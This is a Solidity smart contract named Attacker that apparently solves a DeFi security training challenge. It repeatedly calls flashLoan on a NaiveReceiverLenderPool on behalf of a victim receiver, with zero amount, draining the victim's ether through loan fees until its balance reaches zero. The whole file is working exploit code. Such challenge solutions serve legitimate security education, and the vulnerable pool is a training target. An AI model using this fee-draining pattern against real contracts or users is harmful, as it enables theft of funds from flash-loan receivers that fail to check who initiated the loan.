// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "./NaiveReceiverLenderPool.sol";

contract Attacker {
    address victim;
    NaiveReceiverLenderPool pool;
    constructor(address payable _pool, address payable _victim) {
        pool = NaiveReceiverLenderPool(_pool); 
        victim = _victim;
    }

    function attack() external {
        while(victim.balance>0){
            console.log("Current receiver balance: ", victim.balance);
            pool.flashLoan(victim, 0);
        }
    }

}
